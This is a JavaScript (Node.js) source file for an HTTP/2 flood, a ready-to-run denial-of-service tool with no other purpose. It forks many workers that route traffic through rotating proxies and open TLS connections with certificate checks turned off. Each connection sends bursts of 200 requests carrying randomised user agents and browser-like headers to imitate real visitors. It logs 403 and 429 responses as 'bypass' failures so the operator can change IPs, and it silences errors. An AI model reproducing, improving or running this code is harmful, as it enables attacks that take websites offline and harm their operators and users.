const url = require('url');
const {constants} = require('crypto');
const cluster = require("cluster");
const http = require('http');
const fs = require('fs');
const http2 = require("http2");

require("events").EventEmitter.defaultMaxListeners = Number.MAX_VALUE;
process.on('uncaughtException', function (er) {
    //console.error(er)
});
process.on('unhandledRejection', function (er) {
    //console.error(er)
});

var target_url = process.argv[2];
var delay = process.argv[3];
var threads = process.argv[4];
var proxys = process.argv[5].split(",");
var locations = process.argv[6].split(",");

if (cluster.isMaster) {
    for (var i = 0; i < threads; i++) {
        cluster.fork();
        console.log(`${i + 1} Thread Started`);
    }
    setTimeout(() => {
        process.exit(1);
    }, delay * 1000);
} else {
    console.log('Start flood!');
    startflood(target_url,locations);
}


function getRandomElement(array) {
    var randomIndex = Math.floor(Math.random() * array.length);
    return array[randomIndex];
}

function getRandomLineFromFile(filePath) {
    const fileContent = fs.readFileSync(filePath, 'utf-8');
    const lines = fileContent.split('\n');
    const randomIndex = Math.floor(Math.random() * lines.length);
    const randomLine = lines[randomIndex].replace('\r', '');
    return randomLine;
}

function startflood(page) {
    console.log('Start attack!');
    setInterval(() => {
        var proxy = getRandomElement(proxys).replace(/\n/g, "");
        var parsed = url.parse(page);
        var filePath = 'uas.txt';
        var ua = getRandomLineFromFile(filePath);
        var req = http.request({
            //set proxy session
            host: proxy.split(':')[0],
            port: proxy.split(':')[1],
            method: 'CONNECT',
            path: parsed.host + ":443"
        }, (err) => {
            req.end();
            return 1;
        });
        req.on('connect', function (res, socket, head) {
            if (res.statusCode !== 200)
                throw new Error('Connection rejected by the proxy')
            const tlsConnection = http2.connect(target_url, {
                ciphers: 'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA',
                secureProtocol: ['TLSv1_2_method', 'TLSv1_3_method', 'SSL_OP_NO_SSLv3', 'SSL_OP_NO_SSLv2'],
                secure: true,
                requestCert: true,
                honorCipherOrder: true,
                secureOptions: constants.SSL_OP_NO_SSLv3,
                rejectUnauthorized: false,
                socket: socket}, function () {
                tlsConnection.on('connect', () => {
                    //console.log('Connected to the page!')
                })
                ddoslocation = url.parse(locations[Math.floor(Math.random() * locations.length)]).pathname
                //console.log(ddoslocation)
                var requestbody = {
                    ':path': ddoslocation,
                    "Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
                    'User-Agent':ua,
                    "Accept-Language":"en-US,en;q=0.5",
                    "Referer":page,
                    "Accept-Encoding":"gzip, deflate, br",
                    "Content-Type":"application/x-www-form-urlencoded",
                    "Upgrade-Insecure-Requests":"1",
                    "Sec-Fetch-Dest":"document",
                    "Sec-Fetch-Mode":"navigate",
                    "Sec-Fetch-Site":"same-origin"};
                for (let j = 0; j < 200; j++) {
                    tlsConnection.request(requestbody)
                }

            });
            tlsConnection.on('error', function (data) {
                //console.log(data);
                //tlsConnection.end();
            });
            tlsConnection.on('data', function (data) {
                //console.log(data);
                if (data.includes("403 Forbidden")) {
                    console.log("Error bypass! Change ip!");
                    //tlsConnection.destroy();
                }
                if (data.includes("429 Too Many")) {
                    console.log("Rate limit! Change ip");
                    //tlsConnection.destroy();
                }
            });
        });
        req.end();
    });
}



